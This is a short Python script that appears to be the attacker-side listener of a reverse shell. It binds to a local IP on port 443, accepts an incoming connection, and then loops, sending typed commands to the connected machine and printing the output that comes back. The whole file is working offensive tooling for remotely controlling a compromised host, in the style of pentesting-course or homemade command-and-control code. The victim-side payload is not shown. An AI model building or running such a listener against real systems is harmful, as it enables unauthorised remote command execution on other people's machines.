#!/usr/bin/env python3

import socket
import signal
import sys
from termcolor import colored

def def_handler(sig, frame):
    print(colored(f"[!] Aborting...", 'red'))
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

if __name__ == "__main__":
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server_socket.bind(("192.168.16.102", 443))
    server_socket.listen()

    print("\n[+] Listener active...")

    client_socket, client_address = server_socket.accept()

    print(f"[+] Connected with: {client_address}")

    while True:
        command = input("\n>> ")
        client_socket.send(command.encode())
        command_output = client_socket.recv(2048).decode()

        print(command_output)
